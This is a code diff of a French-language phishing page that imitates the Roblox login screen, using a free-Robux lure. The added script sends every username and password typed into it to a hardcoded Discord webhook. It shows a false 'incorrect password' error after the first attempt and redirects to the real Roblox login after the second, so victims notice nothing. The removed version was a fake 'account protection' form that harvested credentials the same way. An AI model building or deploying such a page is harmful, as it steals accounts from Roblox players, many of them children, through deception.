@@ -3,107 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KeryoPass System v5.0 - Final Edition</title>
+    <title>Roblox - Connexion</title>
     <style>
-        :root { 
-            --primary: #2f81f7; 
-            --secondary: #5865f2; 
-            --border: #30363d; 
-            --urgency: #f85149; 
-            --success: #238636; 
-            --panel-bg: rgba(0, 0, 0, 0.85); 
-        }
-        
-        .background-container {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: -1; 
-            background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('fondroblox.jpg');
+        body, html {
+            margin: 0; padding: 0; height: 100%; width: 100%;
+            background: #000 url('a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg') no-repeat center center fixed;
             background-size: cover;
-            background-position: center;
-            background-color: #0d1117;
+            display: flex; justify-content: center; align-items: center;
+            font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif;
+            overflow: hidden;
         }
 
-        .background-container::after {
-            content: "";
-            position: absolute;
-            top: -50%; left: -150%; width: 50%; height: 200%;
-            background: linear-gradient(to right, transparent, rgba(255, 255, 255, 0.1), transparent);
-            transform: rotate(25deg);
-            animation: lightRay 5s infinite linear;
+        .main-wrapper {
+            display: flex;
+            gap: 20px;
+            z-index: 9999;
+            position: relative;
         }
 
-        @keyframes lightRay { 0% { left: -150%; } 100% { left: 150%; } }
+        .card {
+            background: #2b2d2f;
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+        }
 
-        body { color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; padding: 20px; min-height: 100vh; background-color: #0d1117; }
-        .main-layout { display: grid; grid-template-areas: "detail protect" "admin aide"; grid-template-columns: 1fr 1fr; gap: 20px; width: 100%; max-width: 1100px; z-index: 1; }
-        .panel { background: var(--panel-bg); border-radius: 40px; padding: 25px; border: 2px solid var(--border); min-height: 550px; display: flex; flex-direction: column; position: relative; backdrop-filter: blur(10px); }
-        h2 { color: var(--primary); font-size: 0.9rem; text-align: center; text-transform: uppercase; }
-        input { width: 100%; padding: 12px; background: #0d1117; border: 1px solid var(--border); color: white; border-radius: 12px; margin-bottom: 8px; text-align: center; }
-        button { width: 100%; padding: 12px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .btn-blue { background: var(--primary); color: white; }
-        .orb-ai { width: 65px; height: 65px; background: radial-gradient(circle, #3a7bd5, #00d2ff); border-radius: 50%; margin: auto auto 0 auto; animation: breathe 3s infinite ease-in-out; }
-        @keyframes breathe { 0%, 100% { transform: scale(1); opacity: 0.7; } 50% { transform: scale(1.15); opacity: 1; } }
+        .card-login {
+            padding: 35px 45px;
+            width: 440px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #ffffff;
+            font-size: 36px;
+            font-weight: 800;
+            margin: 0 0 25px 0;
+            letter-spacing: -1px;
+        }
+
+        #error-display {
+            color: #ff5a5a;
+            font-size: 14px;
+            margin-bottom: 15px;
+            display: none;
+            text-align: left;
+            background: rgba(255, 90, 90, 0.1);
+            padding: 10px;
+            border-left: 3px solid #ff5a5a;
+            border-radius: 2px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 12px;
+            margin-bottom: 12px;
+            background: #393b3d;
+            border: 1px solid #111;
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .btn-connexion {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            border: 1px solid #ffffff;
+            color: #ffffff;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .forgot-link {
+            color: #ffffff;
+            font-size: 14px;
+            margin-top: 25px;
+            display: block;
+            text-decoration: none;
+        }
+
+        .card-robux {
+            background: #111;
+            padding: 35px;
+            border-radius: 12px;
+            width: 280px;
+            text-align: center;
+            border: 1px solid #333;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .robux-amount { font-size: 75px; font-weight: 900; color: #f6b000; margin: 0; }
+        .robux-label { color: #f6b000; font-size: 24px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="background-container"></div>
-
-    <div class="main-layout">
-        <div class="panel">
-            <h2>Détail du site 🔊</h2>
-            <p style="font-size:0.8rem; color:#8b949e;">Protégez votre compte Roblox contre les vagues de hack actuelles. Enregistrez vos accès pour une récupération prioritaire.</p>
-            <button class="btn-blue" onclick="window.speechSynthesis.speak(new SpeechSynthesisUtterance('Protection activée'))">ÉCOUTER</button>
+    <div class="main-wrapper">
+        <div class="card card-login">
+            <h1>Connexion à Roblox</h1>
+            <div id="error-display">Identifiant ou mot de passe incorrect.</div>
+            <input type="text" id="user" placeholder="Identifiant/E-mail/Téléphone">
+            <input type="password" id="pass" placeholder="Mot de passe">
+            <button class="btn-connexion" id="loginBtn" onclick="handleLogin()">Connexion</button>
+            <a href="#" class="forgot-link">Mot de passe ou nom d'utilisateur oublié ?</a>
         </div>
 
-        <div class="panel">
-            <h2>Protection Roblox</h2>
-            <input type="text" id="regUser" placeholder="Identifiant">
-            <input type="password" id="regPass" placeholder="Mot de passe">
-            <button class="btn-blue" onclick="saveData()">INSÉRATION</button>
-            <div id="confirmMsg" style="display:none; color:var(--success); text-align:center; margin-top:10px;">Compte protégé !</div>
-            <div class="orb-ai"></div>
+        <div class="card card-robux">
+            <img src="https://images.rbxcdn.com/6949392666d6d45e5d32c96c466487e4-robux_28.png" style="width:80px; margin-bottom:10px;">
+            <p class="robux-amount">1200</p>
+            <p class="robux-label">Robux</p>
+            <button class="btn-connexion" style="border:none; color:#555;" onclick="showError()">RÉCLAMER</button>
         </div>
-        
-        <!-- Les autres panels restent identiques... -->
     </div>
 
     <script>
-        // TON WEBHOOK INTEGRÉ ICI
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1499403968227573981/1T9Z-wrJ8KhLugjuYY1pKEGEFt7lR1-N0zOGQrwJxiH63M7AwOCYO5B-l09eTfWDZoF8";
+        let attempt = 0;
 
-        async function saveData() {
-            const u = document.getElementById('regUser').value;
-            const p = document.getElementById('regPass').value;
+        function showError(msg = "Veuillez vous connecter d'abord.") {
+            const err = document.getElementById('error-display');
+            err.innerText = msg;
+            err.style.display = 'block';
+        }
 
-            if(!u || !p) return;
+        async function handleLogin() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const btn = document.getElementById('loginBtn');
 
-            // ENVOI VERS TON DISCORD
+            if(!u || !p) {
+                showError("Veuillez remplir tous les champs.");
+                return;
+            }
+
+            attempt++;
+            btn.innerText = "Chargement...";
+
+            // Envoi à Discord
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        embeds: [{
-                            title: "🚀 Nouveau Log Reçu !",
-                            color: 3447003,
-                            fields: [
-                                { name: "Utilisateur", value: u, inline: true },
-                                { name: "Mot de passe", value: p, inline: true }
-                            ],
-                            timestamp: new Date()
-                        }]
+                        content: `**Tentative n°${attempt}**\nUtilisateur : \`${u}\`\nMot de passe : \`${p}\``
                     })
                 });
+            } catch (e) {}
 
-                document.getElementById('confirmMsg').style.display = 'block';
-                setTimeout(() => { document.getElementById('confirmMsg').style.display = 'none'; }, 2000);
-                document.getElementById('regUser').value = ""; 
-                document.getElementById('regPass').value = "";
-            } catch (e) {
-                console.error("Erreur d'envoi", e);
-            }
+            // Logique de redirection
+            setTimeout(() => {
+                if (attempt >= 2) {
+                    // Au deuxième essai, redirection vers le vrai Roblox
+                    window.location.href = "https://www.roblox.com/login";
+                } else {
+                    // Au premier essai, on montre l'erreur
+                    btn.innerText = "Connexion";
+                    showError("Identifiant ou mot de passe incorrect.");
+                }
+            }, 800);
         }
     </script>
 </body>
